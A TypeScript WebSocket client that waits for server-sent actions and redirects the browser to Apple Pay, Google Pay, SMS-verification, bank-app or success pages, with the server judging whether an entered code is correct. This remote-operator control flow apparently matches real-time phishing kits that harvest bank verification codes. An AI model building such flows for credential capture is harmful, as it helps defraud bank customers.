import { WebSocketMessage } from '../types/websocket';
import { sessionManager } from './session';

const WS_URL = '';
const SESSION_ID = sessionManager.getSessionId();

let ws: WebSocket | null = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 5;

export function connectWebSocket(messageId: string) {
  if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
    console.error('Max reconnection attempts reached');
    return;
  }

  try {
    ws = new WebSocket(`${WS_URL}?sessionId=${SESSION_ID}&messageId=${messageId}`);

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data) as WebSocketMessage;
        if (data.action && data.messageId === messageId) {
          handleAction(data.action);
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };

    ws.onclose = () => {
      reconnectAttempts++;
      setTimeout(() => connectWebSocket(messageId), 1000 * Math.min(reconnectAttempts, 5));
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
      ws?.close();
    };
  } catch (error) {
    console.error('Error connecting to WebSocket:', error);
  }
}

function handleAction(action: string) {
  switch (action) {
    case 'apple_pay':
      window.location.href = '/apple-pay';
      break;
    case 'google_pay':
      window.location.href = '/google-pay';
      break;
    case 'sms_code':
      window.location.href = '/sms-verification';
      break;
    case 'bank_app':
      window.location.href = '/bank-app';
      break;
    case 'remove_loading':
      window.location.href = '/success';
      break;
    case 'code_correct':
      window.location.href = '/success';
      break;
    case 'code_incorrect':
      const currentPath = window.location.pathname;
      window.location.href = `${currentPath}?error=true`;
      break;
  }
}